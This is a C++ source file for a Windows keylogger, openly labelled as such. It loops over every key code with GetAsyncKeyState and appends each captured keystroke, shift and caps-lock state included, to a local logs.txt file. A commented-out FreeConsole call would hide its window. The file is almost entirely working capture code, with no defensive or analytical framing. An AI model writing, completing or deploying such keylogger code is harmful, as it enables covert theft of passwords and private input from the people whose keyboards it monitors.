// Keylogging application written in C++
// Written by haeoro.

#include "mappings.h"
#include "constants.h"
#include "find_shift_keys.h"

#include <windows.h>
#include <iostream>
#include <fstream>

void writeKeyStroke(int trueKey)
{
    std::ofstream file;
    file.open("logs.txt", std::ios::app);
        
    if (trueKey == BACKSPACE)
        
    {
        file << "BACKSPACE";
    }
    else if (trueKey == ENTER)
    {
        file << "\n";
    }
    else
    {
        file << static_cast<char>(trueKey);
    }
    file.close();
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
    PSTR lpCmdLine, int nCmdShow)
{
    //FreeConsole();
    Maps vkMaps;
    vkMaps.initializeMaps();
    while (1)
    {
        for (int i = 1; i < 254; i++)
        {
            int key = GetAsyncKeyState(i);
            while (key == KEY_IS_PRESSED && i != 16)
            {
                std::cout << i << '\n';
                int specialKey = vkMaps.searchAsciiMaps(i);
                if (isShiftPressed() == 1) 
                {
                    writeKeyStroke(findShiftPlusKey());
                    key = 0;
                }
                else if (vkMaps.searchMiscMaps(i) != 1) 
                {
                    std::cout << "truee";
                    key = 0;
                }
                else if (vkMaps.searchAsciiMaps(i) != 1) 
                {
                    writeKeyStroke(specialKey);
                    key = 0;
                }
                else 
                {
                    int getCapOrLowKey = isCapslockOn(i);
                    writeKeyStroke(getCapOrLowKey);
                    key = 0;
                }
            }
        }
    }
}

/*
            Notes
        

            To-do
        ~ develop naming convention for characters that don't translate to ascii values. 
        {kp=BACKSPACE}

*/ 
